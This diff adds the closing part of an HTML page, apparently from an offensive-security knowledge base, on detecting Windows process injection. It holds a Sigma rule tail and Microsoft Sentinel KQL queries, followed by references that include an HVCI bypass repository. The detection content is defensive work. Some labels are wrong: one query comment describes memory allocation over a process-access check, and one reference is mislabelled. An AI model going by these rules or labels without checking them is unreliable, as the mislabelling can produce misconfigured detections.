+      - 'C:\\Windows\\SYSTEM32\\ntdll.dll+*'
+      - 'C:\\Windows\\System32\\KERNELBASE.dll'
+    GrantedAccess: '0x1F0FFF'
+  condition: selection
+level: high</pre>
+      </div>
+
+      <p><strong>KQL Queries (Microsoft Sentinel):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>SysmonEvent
+| where EventID == 8
+| where not(TargetProcessId in (SourceProcessId))
+| project TimeGenerated, SourceProcessId, TargetProcessId, TargetThreadId, StartAddress
+| where StartAddress != 0x0
+
+// Suspicious RWX memory allocation
+SysmonEvent
+| where EventID == 10
+| where GrantedAccess == "0x1F0FFF"
+| where CallTrace contains "ntdll"
+| summarize Count=count() by SourceProcessId, bin(TimeGenerated, 1h)</pre>
+      </div>
+    </div>
+
+    <!-- 14. REFERENCES -->
+    <div class="content-section" id="references">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://attack.mitre.org/techniques/T1055/" class="reference-link" target="_blank">MITRE ATT&CK T1055</a></li>
+        <li><a href="https://github.com/TheD1rkMtr/ProcessInjectionTechniques" class="reference-link" target="_blank">Process Injection Techniques GitHub</a></li>
+        <li><a href="https://www.elastic.co/blog/detecting-process-injection-windows" class="reference-link" target="_blank">Elastic: Detecting Process Injection</a></li>
+        <li><a href="https://github.com/hzqst/Virtualization-based-security" class="reference-link" target="_blank">Bypassing HVCI</a></li>
+        <li><a href="https://www.mdsec.co.uk/2020/07/dll hollowing-a myth/" class="reference-link" target="_blank">MDN: DLL Hollowing</a></li>
+      </ul>
+    </div>
+
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Evasion</a>
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+    <p>Always test in authorized environments only.</p>
+  </div>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) {
+    mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show'));
+  }
+  const themeToggle = document.getElementById('themeToggle');
+  if (themeToggle) {
+    themeToggle.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      const icon = themeToggle.querySelector('i');
+      const text = themeToggle.querySelector('span');
+      if (document.body.classList.contains('light')) {
+        icon.classList.remove('fa-moon');
+        icon.classList.add('fa-sun');
+        text.textContent = 'Light';
+      } else {
+        icon.classList.remove('fa-sun');
+        icon.classList.add('fa-moon');
+        text.textContent = 'Dark';
+      }
+      localStorage.setItem('theme-preference', document.body.classList.contains('light') ? 'light' : 'dark');
+    });
+  }
+  const savedTheme = localStorage.getItem('theme-preference');
+  if (savedTheme === 'light') document.body.classList.add('light');
+});
+
+function copyCode(btn) {
+  const code = btn.parentElement.querySelector('pre').innerText;
+  navigator.clipboard.writeText(code);
+  btn.textContent = 'Copied!';
+  setTimeout(() => { btn.textContent = 'Copy'; }, 2000);
+}
+</script>
+
+</body>
+</html>
